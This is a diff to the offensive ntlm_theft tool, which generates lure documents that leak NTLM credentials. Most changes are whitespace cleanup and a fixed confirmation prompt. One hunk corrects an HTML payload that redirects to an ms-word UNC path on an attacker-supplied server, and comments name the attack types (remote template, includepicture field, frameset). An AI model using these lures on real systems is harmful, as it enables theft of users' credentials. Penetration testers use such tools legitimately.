@@ -1,4 +1,11 @@
-#!/usr/bin/env 
+#!/usr/bin/env python3
+# /// script
+# requires-python = ">=3.12"
+# dependencies = [
+#     "xlsxwriter>=3.2.9",
+# ]
+# ///
+
 # -*- coding: utf-8 -*-
 from __future__ import print_function
 
@@ -44,7 +51,7 @@ parser.add_argument('-v', '--version', action='version',
     version='%(prog)s 0.1.0 : ntlm_theft by Jacob Wilkin(Greenwolf)')
 parser.add_argument('-vv', '--verbose', action='store_true',dest='vv',help='Verbose Mode')
 parser.add_argument('-g', '--generate',
-	action='store', 
+	action='store',
 	dest='generate',
 	required=True,
 	choices=set((
@@ -58,7 +65,7 @@ parser.add_argument('-g', '--generate',
 		"htm",
 		"docx",
 		"xlsx",
-		"wax",		
+		"wax",
 		"m3u",
 		"asx",
 		"jnlp",
@@ -134,7 +141,7 @@ def create_xml(generate,server,filename):
 # .xml with remote includepicture field attack
 # Filename: shareattack.xml, action=open, attacks=word
 def create_xml_includepicture(generate,server, filename):
-	documentfilename = os.path.join(script_directory,"templates", "includepicture-template.xml") 
+	documentfilename = os.path.join(script_directory,"templates", "includepicture-template.xml")
 	# Read the template file
 	file = open(documentfilename, 'r', encoding="utf8")
 	filedata = file.read()
@@ -165,7 +172,7 @@ def create_htm_handler(generate,server,filename):
 	file.write('''<!DOCTYPE html>
 <html>
 	<script>
-		location.href = 'ms-word:ofe|u|\\''' + server + '''\leak\leak.docx';
+		location.href = 'ms-word:ofe|u|\\\\''' + server + '''\\leak\\leak.docx';
 	</script>
 </html>''')
 	file.close()
@@ -173,13 +180,13 @@ def create_htm_handler(generate,server,filename):
 
 # .docx file with remote includepicture field attack
 def create_docx_includepicture(generate,server,filename):
-	# Source path  
-	src = os.path.join(script_directory,"templates", "docx-includepicture-template") 
-	# Destination path  
+	# Source path
+	src = os.path.join(script_directory,"templates", "docx-includepicture-template")
+	# Destination path
 	dest = os.path.join("docx-includepicture-template")
-	# Copy the content of  
-	# source to destination  
-	shutil.copytree(src, dest)  
+	# Copy the content of
+	# source to destination
+	shutil.copytree(src, dest)
 	documentfilename = os.path.join("docx-includepicture-template", "word", "_rels", "document.xml.rels")
 	# Read the template file
 	file = open(documentfilename, 'r')
@@ -200,13 +207,13 @@ def create_docx_includepicture(generate,server,filename):
 # Filename: shareattack.docx (unzip and put inside word\_rels\settings.xml.rels), action=open, attacks=word
 # Instructions: Word > Create New Document > Choose a Template > Unzip docx, change target in word\_rels\settings.xml.rels change target to smb server
 def create_docx_remote_template(generate,server,filename):
-	# Source path  
-	src = os.path.join(script_directory,"templates", "docx-remotetemplate-template") 
-	# Destination path  
+	# Source path
+	src = os.path.join(script_directory,"templates", "docx-remotetemplate-template")
+	# Destination path
 	dest = os.path.join("docx-remotetemplate-template")
-	# Copy the content of  
-	# source to destination  
-	shutil.copytree(src, dest)  
+	# Copy the content of
+	# source to destination
+	shutil.copytree(src, dest)
 	documentfilename = os.path.join("docx-remotetemplate-template", "word", "_rels", "settings.xml.rels")
 	# Read the template file
 	file = open(documentfilename, 'r')
@@ -225,13 +232,13 @@ def create_docx_remote_template(generate,server,filename):
 
 # .docx file with Frameset attack
 def create_docx_frameset(generate,server,filename):
-	# Source path  
-	src = os.path.join(script_directory,"templates", "docx-frameset-template") 
-	# Destination path  
+	# Source path
+	src = os.path.join(script_directory,"templates", "docx-frameset-template")
+	# Destination path
 	dest = os.path.join("docx-frameset-template")
-	# Copy the content of  
-	# source to destination  
-	shutil.copytree(src, dest)  
+	# Copy the content of
+	# source to destination
+	shutil.copytree(src, dest)
 	documentfilename = os.path.join("docx-frameset-template", "word", "_rels", "webSettings.xml.rels")
 	# Read the template file
 	file = open(documentfilename, 'r')
@@ -554,7 +561,8 @@ def create_lnk(generate,server,filename):
 
 # create folder to hold templates, if already exists delete it
 if os.path.exists(args.filename):
-	if input(f"Are you sure to want to delete {args.filename}? [Y/N]").lower not in ["y", "yes"]:
+	response = input(f"Are you sure you want to delete {args.filename}? [Y/N] ").lower()
+	if response not in ["y", "yes"]:
 		exit(0)
 	shutil.rmtree(args.filename)
 os.makedirs(args.filename)
@@ -631,7 +639,7 @@ elif(args.generate == "docx"):
 
 elif(args.generate == "xlsx"):
 	create_xlsx_externalcell(args.generate, args.server, os.path.join(args.filename, args.filename + "-(externalcell).xlsx"))
-	
+
 elif(args.generate == "wax"):
 	create_wax(args.generate, args.server, os.path.join(args.filename, args.filename + ".wax"))
 
